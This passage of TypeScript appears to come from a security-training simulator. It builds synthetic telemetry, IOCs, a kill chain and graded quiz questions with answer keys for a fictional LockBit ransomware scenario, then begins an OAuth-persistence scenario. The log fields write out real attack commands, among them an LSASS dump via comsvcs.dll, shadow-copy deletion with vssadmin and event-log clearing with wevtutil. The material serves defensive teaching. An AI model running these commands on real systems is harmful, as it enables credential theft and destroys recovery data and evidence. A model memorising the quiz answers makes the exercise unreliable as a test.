        "winlog.event_data.ProcessGuid": "{f1e2d3c4-b5a6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "7741",
        "winlog.event_data.Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "winlog.event_data.TargetObject": "HKU\\S-1-5-21-3421479547-3897544621-1789562108-1205\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\DelegateExecute",
        "winlog.event_data.Details": "",
        "winlog.event_data.User": "CRYOTECH\\cmartin",
      },
    },
    {
      id: "evt_03c_uac_bypass", ts: T(88 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip,
      severity: "high", mitre_technique: "T1548.002",
      process: {
        name: "fodhelper.exe", pid: 6120, parent_name: "powershell.exe", parent_pid: 7741,
        cmdline: "fodhelper.exe",
        user: "CRYOTECH\\cmartin", integrity: "high",
      },
      description: "fodhelper.exe started at High integrity on WS-FIN-1193 with powershell.exe as its parent, one minute after the registry write.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-06T04:43:00.000Z",
        "winlog.event_data.ProcessGuid": "{f1e2d3c4-b5a6-a1b2-0006-c3d4e5f60006}",
        "winlog.event_data.ProcessId": "6120",
        "winlog.event_data.Image": "C:\\Windows\\System32\\fodhelper.exe",
        "winlog.event_data.CommandLine": "fodhelper.exe",
        "winlog.event_data.ParentProcessGuid": "{f1e2d3c4-b5a6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "winlog.event_data.ParentProcessId": "7741",
        "winlog.event_data.User": "CRYOTECH\\cmartin",
        "winlog.event_data.IntegrityLevel": "High",
        "winlog.event_data.OriginalFileName": "FODHELPER.EXE",
        "winlog.event_data.Company": "Microsoft Corporation",
      },
    },
    {
      id: "evt_04_lsass", ts: T(90 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: zero.hostname, user_email: zero.email,
      severity: "critical", mitre_technique: "T1003.001",
      process: {
        name: "rundll32.exe", pid: 9914, parent_name: "fodhelper.exe", parent_pid: 6120,
        cmdline: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 704 C:\\Windows\\Temp\\mem.dmp full",
        user: "CRYOTECH\\cmartin", integrity: "high",
      },
      file: { path: "C:\\Windows\\Temp\\mem.dmp" },
      description: "CrowdStrike detected rundll32.exe on WS-FIN-1193 using comsvcs.dll to dump lsass.exe memory to mem.dmp.",
      raw: {
        // CrowdStrike Falcon — detection metadata
        "crowdstrike.event_simplename": "CredentialDumpingTool",
        "crowdstrike.detection.id": "ldt:e7f8a1b2c3d4e5f6a1b2c3d4e5f6a1b2:1234567899",
        "crowdstrike.detection.description": "rundll32.exe used the comsvcs.dll MiniDump export to read lsass.exe process memory with PROCESS_ALL_ACCESS. Consistent with credential theft.",
        "crowdstrike.detection.scenario": "credential_theft_lsass_dump",
        "crowdstrike.detection.tactic": "Credential Access",
        "crowdstrike.detection.tactic_id": "TA0006",
        "crowdstrike.detection.technique": "OS Credential Dumping: LSASS Memory",
        "crowdstrike.detection.technique_id": "T1003.001",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.behaviors": "rundll32.exe loaded comsvcs.dll|MiniDump export invoked|lsass.exe opened with PROCESS_ALL_ACCESS|Dump file written to C:\\Windows\\Temp",
        "crowdstrike.sensor.id": "c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2",
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "process_created",
        // Source process — rundll32.exe (the LOLBin doing the dump)
        "process.name": "rundll32.exe", "process.pid": "9914",
        "process.command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 704 C:\\Windows\\Temp\\mem.dmp full",
        "process.parent.name": "fodhelper.exe", "process.parent.pid": "6120",
        // Target process — lsass.exe (the victim of the memory dump)
        "process.target.name": "lsass.exe",
        "process.target.pid": "704",
        "process.target.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe",
        "process.target.access_rights": "0x1FFFFF",
        "process.target.access_rights_description": "PROCESS_ALL_ACCESS",
        // LOLBAS — comsvcs.dll
        "lolbas.name": "comsvcs.dll",
        "lolbas.function": "MiniDump",
        "lolbas.signed": "true",
        "lolbas.vendor": "Microsoft Corporation",
        // Output file (the credential dump)
        "file.path": "C:\\Windows\\Temp\\mem.dmp",
        "file.type": "memory_dump",
        "user.name": "CRYOTECH\\cmartin",
        "host.name": "WS-FIN-1193",
      },
    },
    {
      id: "evt_04b_kerberos_tgt", ts: T(92 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "kerberos_tgt",
      hostname: "DC-CORP-01", user_email: zero.email,
      severity: "critical", mitre_technique: "T1550.002",
      description: "A Kerberos TGT for domain admin account da-backup was requested from WS-FIN-1193 using RC4 encryption, two minutes after the LSASS dump.",
      raw: {
        "event.code": "4768",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "da-backup",
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        "winlog.event_data.TargetSid": "S-1-5-21-3421479547-3897544621-1789562108-1108",
        "winlog.event_data.ServiceName": "krbtgt",
        "winlog.event_data.TicketOptions": "0x40810010",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.IPAddress": zero.ip ?? "10.10.20.33",
        "winlog.event_data.IPPort": "51888",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.PreAuthType": "2",
      },
    },
    {
      id: "evt_04c_domain_admin_logon", ts: T(93 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: "DC-CORP-01", user_email: "da-backup@cryotech.com",
      severity: "critical", mitre_technique: "T1078",
      description: "Domain admin account da-backup authenticated to DC-CORP-01 via a network logon (Type 3) originating from WS-FIN-1193.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.TargetUserName": "da-backup",
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        "winlog.event_data.LogonProcessName": "NtLmSsp",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": zero.hostname,
        "winlog.event_data.IpAddress": zero.ip ?? "10.10.20.33",
        "winlog.event_data.IpPort": "51889",
        "winlog.event_data.SubjectUserName": "-",
        "winlog.event_data.SubjectDomainName": "-",
        "winlog.event_data.KeyLength": "0",
      },
    },
    {
      id: "evt_05_smb_lateral", ts: T(105 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
      hostname: zero.hostname, user_email: zero.email,
      src_ip: zero.ip, dst_ip: server.ip, dst_port: 445, protocol: "tcp",
      severity: "critical", mitre_technique: "T1021.002",
      description: `WS-FIN-1193 (${zero.ip}) opened an SMB connection to the ADMIN$ share on FS-CORP-01 (${server.ip}), authenticated with NTLM.`,
      raw: {
        "event.action": "network-connection",
        "source.ip": "10.10.20.33", "source.hostname": "WS-FIN-1193",
        "destination.ip": "10.10.10.12", "destination.port": "445",
        "destination.hostname": "FS-CORP-01",
        "network.protocol": "smb", "network.transport": "tcp",
        "authentication.method": "NTLM", "authentication.status": "success",
        "smb.share": "\\\\FS-CORP-01\\ADMIN$",
      },
    },
    {
      id: "evt_06_psexec", ts: T(106 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      hostname: server.hostname, user_email: server.email, src_ip: zero.ip,
      severity: "critical", mitre_technique: "T1569.002",
      process: {
        name: "PSEXESVC.exe", pid: 3310, parent_name: "services.exe", parent_pid: 728,
        cmdline: "PSEXESVC.exe",
        user: "NT AUTHORITY\\SYSTEM", integrity: "system",
      },
      file: { path: "C:\\Windows\\PSEXESVC.exe", sha256: psxHash },
      description: "PSEXESVC.exe was installed and launched as SYSTEM on FS-CORP-01, delivered remotely from WS-FIN-1193 over the ADMIN$ share.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-06T05:01:00.000Z",
        "winlog.event_data.ProcessGuid": "{f1e2d3c4-b5a6-a1b2-0002-c3d4e5f60002}",
        "winlog.event_data.ProcessId": "3310",
        "winlog.event_data.Image": "C:\\Windows\\PSEXESVC.exe",
        "winlog.event_data.CommandLine": "C:\\Windows\\PSEXESVC.exe",
        "winlog.event_data.ParentProcessGuid": "{f1e2d3c4-b5a6-a1b2-0003-c3d4e5f60003}",
        "winlog.event_data.ParentImage": "C:\\Windows\\System32\\services.exe",
        "winlog.event_data.ParentProcessId": "728",
        "winlog.event_data.User": "NT AUTHORITY\\SYSTEM",
        "winlog.event_data.IntegrityLevel": "System",
        "winlog.event_data.Hashes": `SHA256=${psxHash}`,
        "winlog.event_data.Company": "Sysinternals - www.sysinternals.com",
        "winlog.event_data.OriginalFileName": "psexesvc.exe",
      },
    },
    {
      id: "evt_07_vssadmin", ts: T(120 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: server.hostname,
      severity: "critical", mitre_technique: "T1490",
      process: {
        name: "vssadmin.exe", pid: 7712, parent_name: "PSEXESVC.exe", parent_pid: 3310,
        cmdline: "vssadmin.exe delete shadows /all /quiet",
        user: "NT AUTHORITY\\SYSTEM", integrity: "system",
      },
      description: "vssadmin.exe, launched by PSEXESVC.exe, deleted all 12 Volume Shadow Copies on FS-CORP-01.",
      raw: {
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.detection.description": "vssadmin.exe invoked with 'delete shadows /all /quiet' — deletes all Volume Shadow Copies, removing the built-in recovery path immediately before mass file encryption.",
        "crowdstrike.detection.scenario": "ransomware_pre_encryption_activity",
        "crowdstrike.detection.tactic": "Impact",
        "crowdstrike.detection.tactic_id": "TA0040",
        "crowdstrike.detection.technique": "Inhibit System Recovery",
        "crowdstrike.detection.technique_id": "T1490",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.behaviors": "vssadmin.exe launched by PSEXESVC.exe|delete shadows /all /quiet — removes all restore points|SYSTEM integrity process",
        "event.action": "process_created",
        "process.name": "vssadmin.exe", "process.pid": "7712",
        "process.command_line": "vssadmin.exe delete shadows /all /quiet",
        "process.parent.name": "PSEXESVC.exe", "process.parent.pid": "3310",
        "user.name": "NT AUTHORITY\\SYSTEM", "host.name": "FS-CORP-01",
      },
    },
    {
      id: "evt_08_log_clear", ts: T(121 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      hostname: server.hostname,
      severity: "high", mitre_technique: "T1070.001",
      process: {
        name: "cmd.exe", pid: 8841, parent_name: "PSEXESVC.exe", parent_pid: 3310,
        cmdline: "cmd.exe /c wevtutil cl Security & wevtutil cl System & wevtutil cl Application",
        user: "NT AUTHORITY\\SYSTEM", integrity: "system",
      },
      description: "wevtutil.exe cleared the Security, System, and Application event logs on FS-CORP-01 right after the shadow copies were deleted.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-06T05:16:00.000Z",
        "winlog.event_data.ProcessGuid": "{f1e2d3c4-b5a6-a1b2-0004-c3d4e5f60004}",
        "winlog.event_data.ProcessId": "8841",
        "winlog.event_data.Image": "C:\\Windows\\System32\\cmd.exe",
        "winlog.event_data.CommandLine": "cmd.exe /c wevtutil cl Security & wevtutil cl System & wevtutil cl Application",
        "winlog.event_data.ParentProcessGuid": "{f1e2d3c4-b5a6-a1b2-0002-c3d4e5f60002}",
        "winlog.event_data.ParentImage": "C:\\Windows\\PSEXESVC.exe",
        "winlog.event_data.ParentProcessId": "3310",
        "winlog.event_data.User": "NT AUTHORITY\\SYSTEM",
        "winlog.event_data.IntegrityLevel": "System",
      },
    },
    {
      id: "evt_08b_audit_clear", ts: T(121 * MIN + 5_000),
      source: "ad", vendor: "Windows Security", event_type: "audit_log_cleared",
      hostname: "FS-CORP-01", user_email: "svc-backup@cryotech.com",
      severity: "high", mitre_technique: "T1070.001",
      description: "Windows recorded Event 1102 on FS-CORP-01 — the Security audit log was cleared.",
      raw: {
        "event.code": "1102",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.SubjectUserName": "FS-CORP-01$",
        "winlog.event_data.SubjectDomainName": "CRYOTECH",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectLogonId": "0x3e4a2",
      },
    },
    {
      id: "evt_09_ransom_exec", ts: T(123 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_detection",
      hostname: server.hostname,
      severity: "critical", mitre_technique: "T1486",
      file: { path: "C:\\Windows\\Temp\\wu_update.exe", sha256: rswHash },
      description: `CrowdStrike detected wu_update.exe (LockBit 3.0) running as SYSTEM on FS-CORP-01 but did not block it — the server policy is set to detection-only.`,
      raw: {
        "event.action": "av_detection",
        "file.path": "C:\\Windows\\Temp\\wu_update.exe",
        "file.hash.sha256": rswHash,
        "file.name": "wu_update.exe",
        "host.name": "FS-CORP-01",
        "user.name": "NT AUTHORITY\\SYSTEM",
        "malware.name": "LockBit.3.0", "malware.family": "LockBit", "malware.type": "Ransomware",
        "action_result": "detected_not_blocked",
        "policy.name": "Server-Detection-Only",
        "quarantine.status": "not_quarantined",
      },
    },
    {
      id: "evt_10_encryption", ts: T(124 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_modify",
      hostname: server.hostname,
      severity: "critical", mitre_technique: "T1486",
      description: "2,847 files (18GB) across the Finance, HR, and Contracts shares on FS-CORP-01 were renamed with a .locked extension in 90 seconds.",
      raw: {
        "event.action": "mass_file_encryption",
        "host.name": "FS-CORP-01",
        "user.name": "NT AUTHORITY\\SYSTEM",
        "files.encrypted_count": "2847", "files.extension_added": ".locked",
        "file.ransom_note": "LockBit_Ransom.txt",
        "storage.size": "18 GB",
        "shares.affected": "Finance, HR, Contracts",
      },
    },
    {
      id: "evt_11_ransom_note", ts: T(125 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: server.hostname,
      severity: "high", mitre_technique: "T1486",
      file: { path: "C:\\Shares\\Finance\\LockBit_Ransom.txt" },
      description: "LockBit_Ransom.txt was dropped into 14 shared folders on FS-CORP-01, demanding 0.25 BTC within 72 hours via a dark web payment link.",
      raw: {
        "event.action": "file_created",
        "file.name": "LockBit_Ransom.txt",
        "file.path": "C:\\Shares\\Finance\\LockBit_Ransom.txt",
        "host.name": "FS-CORP-01",
        "ransom.demand_btc": "0.25", "ransom.deadline_hours": "72",
        "ransom.copies_dropped": "14",
        "url.full": "http://lockbit3olp7oetlc.onion",
      },
    },

    // ── CORRELATED: Baseline — last normal file access by c.martin before ransom ─
    {
      id: "evt_rsw_baseline_file", ts: T(-5 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "file_access", severity: "informational",
      hostname: zero.hostname, user_email: zero.email,
      description: "c.martin opened Budget_Q2_2026.xlsx from the Finance share on FS-CORP-01.",
      raw: {
        "event.action": "FileAccessed",
        "file.path": "\\\\FS-CORP-01\\Finance\\Budget_Q2_2026.xlsx",
        "file.name": "Budget_Q2_2026.xlsx",
        "user.name": "CRYOTECH\\cmartin",
        "host.name": zero.hostname,
        "source.ip": zero.ip,
        "event.outcome": "success",
      },
    },

    // ── CORRELATED: VSS snapshot status BEFORE deletion (backup was available) ───
    {
      id: "evt_rsw_vss_before", ts: T(119 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon",
      event_type: "process_create", severity: "informational",
      hostname: server.hostname,
      description: "vssadmin.exe ran list shadows on FS-CORP-01 under PSEXESVC.exe, returning 12 shadow copies.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-06T05:14:00.000Z",
        "winlog.event_data.ProcessGuid": "{f1e2d3c4-b5a6-a1b2-0005-c3d4e5f60005}",
        "winlog.event_data.ProcessId": "6602",
        "winlog.event_data.Image": "C:\\Windows\\System32\\vssadmin.exe",
        "winlog.event_data.CommandLine": "vssadmin list shadows",
        "winlog.event_data.ParentProcessGuid": "{f1e2d3c4-b5a6-a1b2-0002-c3d4e5f60002}",
        "winlog.event_data.ParentImage": "C:\\Windows\\PSEXESVC.exe",
        "winlog.event_data.ParentProcessId": "3310",
        "winlog.event_data.User": "NT AUTHORITY\\SYSTEM",
        "winlog.event_data.IntegrityLevel": "System",
        "vss.oldest_shadow": "2026-04-29T02:00:00Z",
        "vss.newest_shadow": "2026-05-05T02:00:00Z",
      },
    },

    // ── CORRELATED: Firewall — C2 beacon from FS-CORP-01 after PsExec ────────────
    {
      id: "evt_rsw_fw_server_c2", ts: T(110 * MIN),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "high",
      mitre_technique: "T1071.001",
      src_ip: server.ip, dst_ip: c2Ip, dst_port: 443,
      hostname: server.hostname,
      description: `FS-CORP-01 began sending outbound HTTPS traffic to ${c2Ip} at regular intervals.`,
      raw: {
        "event.action": "allow",
        "source.ip": server.ip,
        "destination.ip": c2Ip,
        "destination.port": "443",
        "pan.app": "ssl",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "threat.category": "CommandAndControl",
        "url.category": "Unknown",
        "network.bytes_out": "1024",
        "network.bytes_in": "8192",
      },
    },

    // ── CORRELATED: Outcome — AV attempted detection at ransomware execution ──────
    {
      id: "evt_rsw_av_miss", ts: T(122 * MIN + 55_000),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "av_detection", severity: "medium",
      hostname: server.hostname,
      description: "CrowdStrike flagged the payload on FS-CORP-01 as a high-confidence malware detection, but the sensor was configured to log only and took no action.",
      raw: {
        "event.action": "av_detection",
        "file.path": "C:\\Windows\\Temp\\wu_update.exe",
        "file.hash.sha256": rswHash,
        "host.name": server.hostname,
        "user.name": "NT AUTHORITY\\SYSTEM",
        "policy.name": "Server-Detection-Only",
        "action_result": "logged_not_blocked",
        "quarantine.status": "not_quarantined",
      },
    },
  ];

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "domain", value: c2Dom,                           reputation: "malicious",  tags: ["c2", "cobalt-strike"] },
    { type: "ip",     value: c2Ip,                            reputation: "malicious",  tags: ["c2"] },
    { type: "sha256", value: rswHash,                         reputation: "malicious",  tags: ["lockbit3", "ransomware"] },
    { type: "sha256", value: psxHash,                         reputation: "suspicious", tags: ["psexec", "lateral"] },
    { type: "email",  value: "payroll@cryotech-updates.net",  reputation: "malicious",  tags: ["phishing"] },
    { type: "host",   value: zero.hostname,                   reputation: "suspicious", tags: ["patient-zero"] },
    { type: "host",   value: server.hostname,                 reputation: "suspicious", tags: ["encrypted", "lateral-target"] },
    { type: "user",   value: zero.email,                      reputation: "suspicious", tags: ["victim"] },
  ];

  const killchain = [
    { ts: T(0),          phase: "Initial Access",              action: "Phishing 'Salary_Adjustment_Notice.docm' delivered — keyword whitelist bypass" },
    { ts: T(45_000),     phase: "Execution",                   action: "WINWORD macro spawns encoded PowerShell → Cobalt Strike stage-1 loader" },
    { ts: T(3 * MIN),    phase: "Command & Control",           action: "Cobalt Strike HTTPS beacon to cobalt-cdn-updates.xyz every 60s" },
    { ts: T(87 * MIN),   phase: "Privilege Escalation",         action: "fodhelper UAC bypass — beacon gains a High-integrity token" },
    { ts: T(90 * MIN),   phase: "Credential Access",           action: "LSASS dumped via comsvcs.dll — domain admin hash extracted" },
    { ts: T(105 * MIN),  phase: "Lateral Movement",            action: "Pass-the-hash SMB to FS-CORP-01 ADMIN$ — PsExec deployed" },
    { ts: T(120 * MIN),  phase: "Impact — Recovery Inhibition", action: "vssadmin deletes all 12 shadow copies — recovery prevented" },
    { ts: T(121 * MIN),  phase: "Defense Evasion",              action: "Security, System and Application logs cleared — Event 1102 survives" },
    { ts: T(123 * MIN),  phase: "Impact — Encryption",         action: "LockBit 3.0 encrypts 2,847 files (18GB) across Finance, HR, Contracts shares" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Which host is 'patient zero' — the first infected machine?", kind: "single",
      options: [
        { value: "zero",   label: `${zero.hostname} (${zero.email}) — finance workstation` },
        { value: "server", label: `${server.hostname} — the file server` },
        { value: "dc",     label: "DC01 — the domain controller" },
        { value: "unknown", label: "Cannot be determined from the available logs" },
      ],
      answer: "zero", xp: 50,
      explanation: `${zero.hostname} is patient zero: it received the phishing email, executed the macro, established the C2 beacon, and performed the LSASS dump. ${server.hostname} was only compromised later via PsExec lateral movement from WS-FIN-1193.` },
    { id: "q2", prompt: "Which MITRE technique describes the lateral movement from WS-FIN-1193 to FS-CORP-01?", kind: "single",
      options: [
        { value: "T1021.002", label: "T1021.002 — SMB/Windows Admin Shares (pass-the-hash + PsExec)" },
        { value: "T1078",     label: "T1078 — Valid Accounts (stolen plaintext password)" },
        { value: "T1021.001", label: "T1021.001 — Remote Desktop Protocol" },
        { value: "T1105",     label: "T1105 — Ingress Tool Transfer only" },
      ],
      answer: "T1021.002", xp: 50,
      explanation: "PSEXESVC.exe was deployed over SMB to the ADMIN$ share using a stolen domain admin NTLM hash (pass-the-hash). This is T1021.002 — SMB/Windows Admin Shares combined with a pass-the-hash technique. RDP was not used." },
    { id: "q3", prompt: "Why did the attacker run vssadmin BEFORE starting encryption?", kind: "single",
      options: [
        { value: "inhibit",  label: "Destroy shadow copies so victims cannot restore files without paying (T1490)" },
        { value: "exfil",    label: "To export the shadow copy contents to their C2 server before encrypting the originals" },
        { value: "persist",  label: "To create a clean VSS snapshot they can restore from if they need to re-enter later" },
        { value: "escalate", label: "To escalate from local admin to SYSTEM by abusing the Volume Shadow Copy service" },
      ],
      answer: "inhibit", xp: 75,
      explanation: "Deleting Volume Shadow Copies (T1490 — Inhibit System Recovery) prevents the victim from using Windows built-in recovery to restore encrypted files. Without shadow copies or an external backup, the victim's only options are pay the ransom or restore from an offline backup — if one exists." },
    { id: "q4", prompt: "The CrowdStrike prevention policy was set to 'Detection Only' on servers. What should it have been, and what would that have changed?", kind: "single",
      options: [
        { value: "prevent",  label: "Prevention — the ransomware binary would have been blocked before encrypting any files" },
        { value: "monitor",  label: "Monitor — generates more detailed telemetry without blocking" },
        { value: "disabled", label: "Disabled — servers shouldn't run AV due to performance impact" },
        { value: "detection", label: "Detection Only is correct — blocking can cause false positives on servers" },
      ],
      answer: "prevent", xp: 75,
      explanation: "The ML engine scored the payload 91/100, well above the 80-point block threshold — the sensor was confident. What stopped it from acting was the policy: with prevention disabled it can only log. Setting Prevention on servers would have blocked the payload before encryption began. 'Detection Only' is a common server misconfiguration driven by availability fears, and here it cost the whole file server." },
    { id: "q5", prompt: "You have the full timeline. Which single containment action would have broken the attack chain before encryption — and held up as the right call at the moment it was taken?", kind: "single",
      options: [
        { value: "isolate_zero", label: "Network-isolate WS-FIN-1193 when the LSASS dump was detected at 04:45 — before any credential could be reused" },
        { value: "block_c2",     label: "Block the C2 domain at the perimeter firewall when beaconing to it started at 03:18 — the earliest network indicator" },
        { value: "isolate_fs",   label: "Network-isolate FS-CORP-01 when vssadmin deleted the shadow copies at 05:15 — the first confirmed destructive act" },
        { value: "disable_user", label: "Disable c.martin's account when the out-of-hours logon appeared at 02:45 — the very first anomaly in the timeline" },
      ],
      answer: "isolate_zero", xp: 100,
      explanation: "Isolating WS-FIN-1193 at the LSASS dump breaks the chain: it removes the attacker's foothold entirely, and it happens while the stolen hash is still unused — the first reuse is the 04:47 TGT request, two minutes later. Blocking the C2 domain at 03:18 is the tempting answer, and the evidence at 03:18 IS strong enough to act on: WINWORD spawning hidden Base64 PowerShell that beacons every 60 seconds to a freshly-registered domain over a self-signed certificate is a textbook Cobalt Strike beacon, not merely 'suspicious'. It fails for a different reason — blocking an indicator is not containing a host. The implant keeps running, and this scenario proves the attacker had a second channel: at 05:05 the traffic goes to the raw IP 185.220.101.45, which no domain block would have touched. Disabling c.martin at 02:45 acts on the only genuinely ambiguous event in the timeline and would not stop a beacon already executing in that user's session. By 05:15 the shadow copies are gone and the attacker holds domain admin, so isolating the file server then is damage control rather than prevention. The lesson: the right containment action is the one that removes the adversary's access, not the one that removes one of their indicators." },
  ];

  return {
    scenario_id: scenarioId,
    title: "Ransomware Outbreak — LockBit 3.0",
    threat_actor: "LockBit 3.0 affiliate (Ransomware-as-a-Service)",
    attack_kind: "ransomware",
    briefing: "CrowdStrike raised a critical detection on FS-CORP-01 at 05:18 and the Finance share is reporting inaccessible files. A separate high-severity alert fired earlier on WS-FIN-1193. Both are queued to you.",
    narrative: `At 03:15 on a Wednesday, a finance analyst working late received what appeared to be a payroll update email. The macro-enabled attachment bypassed email filters and spawned a Cobalt Strike beacon that ran silently for 90 minutes. At 04:43 the beacon elevated itself through a fodhelper UAC bypass, and two minutes later domain admin credentials were extracted from LSASS memory. The attacker pivoted over SMB to the central file server, deleted all 12 Volume Shadow Copies, cleared the Security and System event logs, then unleashed LockBit 3.0 — encrypting 2,847 files (18GB) across Finance, HR, and Contracts shares in under 2 minutes. Your job: identify patient zero, trace the lateral movement, understand why the CrowdStrike sensor didn't block it, and determine the earliest point where this attack could have been stopped.`,
    learning_objectives: [
      "Identify the patient zero host and trace the infection path through the kill chain",
      "Understand PsExec lateral movement via SMB pass-the-hash and SYSTEM-level execution",
      "Recognize pre-ransomware indicators: shadow copy deletion and event log clearing",
      "Understand the impact of 'Detection Only' vs 'Prevention' EDR policies",
      "Determine the earliest effective containment point in a ransomware attack chain",
      "Spot the UAC bypass that turns a user-level foothold into a credential-theft capability",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 4: OAuth App Persistence — Cloud APT
// =========================================================================

export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): ScenarioBundle {
  const B = new Date("2026-05-06T02:30:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const HR  = 60 * MIN;

  const victim     = { hostname: "MBP-SCHEN-01", email: "s.chen@cryotech.com",  ip: "10.10.50.18" };
  const sprayIp    = "91.108.56.199";
  const sessionIp  = "185.220.101.88";
  const appId      = "3a7f8b2c-d491-4e6a-9f3b-1c5d8e7a2b4f";

  const events: TelemetryEvent[] = [
    {
      id: "evt_01_spray", ts: T(0),
      source: "ad", vendor: "Microsoft Entra ID", event_type: "auth_failure",
      src_ip: sprayIp,
      severity: "high", mitre_technique: "T1110.003",
      description: `43 failed Microsoft 365 login attempts hit 12 accounts, including s.chen, from the same German IP (${sprayIp}) within 6 minutes.`,
      raw: {
        // Entra ID sign-in failure aggregate — password spray from Germany
        "azure.signinlogs.correlation_id": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
        "azure.signinlogs.result_type": "50126",
        "azure.signinlogs.result_description": "Invalid username or password",
        "azure.signinlogs.client_app_used": "Browser",
        "azure.signinlogs.authentication_requirement": "singleFactorAuthentication",
        "azure.signinlogs.conditional_access_status": "notApplied",
        "azure.signinlogs.risk_level_aggregated": "medium",
        "azure.signinlogs.risk_state": "atRisk",
        "azure.signinlogs.is_interactive": "true",
        "azure.signinlogs.tenant_id": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "azure.signinlogs.location.country_or_region": "DE",
        "azure.signinlogs.location.city": "Frankfurt",
        // Windows 4625 reference (DC-side)
        "winlog.event_id": "4625",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2048401",
        "winlog.event_data.SubjectUserSid": "S-1-0-0",
        "winlog.event_data.SubjectUserName": "-",
        "winlog.event_data.SubjectDomainName": "-",
        "winlog.event_data.TargetUserName": "s.chen",
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        "winlog.event_data.Status": "0xC000006D",
        "winlog.event_data.Status_description": "Unknown user name or bad password",
        "winlog.event_data.SubStatus": "0xC000006A",
        "winlog.event_data.SubStatus_description": "Wrong password",
        "winlog.event_data.FailureReason": "%%2312",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.LogonProcessName": "NtLmSsp",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": "-",
        "winlog.event_data.IpAddress": sprayIp,
        "winlog.event_data.IpPort": "52841",
        // ECS fields
        "event.code": "4625",
        "event.action": "logon-failed",
        "event.outcome": "failure",
        "event.created": "2026-05-06T02:30:00.000Z",
        "authentication.status": "failure",
        "authentication.failure_reason": "wrong_password",
        "authentication.protocol": "NTLM",
        "logon.type": "3",
        "source.ip": sprayIp,
        "source.geo.country_name": "Germany",
      },
    },
    {
      id: "evt_02_mfa_accept", ts: T(10 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "mfa_challenge",
      user_email: victim.email, src_ip: sprayIp,
      severity: "critical", mitre_technique: "T1078",
      description: `s.chen signed in successfully from Germany (${sprayIp}) at 02:40 after approving an MFA push.`,
      raw: {
        // Azure AD / Entra ID Sign-In Log — MFA fatigue victim accepted push (s.chen, Germany)
